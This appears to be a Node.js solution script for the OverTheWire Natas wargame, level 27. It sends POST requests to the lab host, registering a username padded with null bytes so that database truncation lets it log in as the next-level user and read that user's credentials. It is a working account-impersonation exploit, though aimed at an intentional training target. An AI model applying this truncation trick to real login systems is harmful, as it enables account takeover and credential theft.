const http = require("http");
const fs = require("fs");

// Creds
const init = 26;
const user = "natas" + (init + 1);
const pass = fs
  .readFileSync("../../../etc/otw/natas.pass", "utf8")
  .split("\n")
  [init].trim();

// Conf
const host = `${user}.natas.labs.overthewire.org`;
const auth = Buffer.from(`${user}:${pass}`).toString("base64");
const opts = {
  headers: {
    Authorization: `Basic ${auth}`,
  },
};

// Post
const r = (body) => {
  return new Promise((resolve, reject) => {
    opts.hostname = host;
    opts.path = "/";
    opts.method = "POST";
    opts.headers["Content-Type"] = "application/x-www-form-urlencoded";

    const post = http.request(opts, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => resolve(data));
    });

    post.write(body);

    post.on("error", (e) => reject(new Error(e.message)));
    post.end();
  });
};

r("username=natas28" + "%00".repeat(57) + "a" + "&password=")
  .then((_) => {
    return r("username=natas28&password=");
  })
  .then((finalResponse) => {
    console.log(finalResponse);
  });
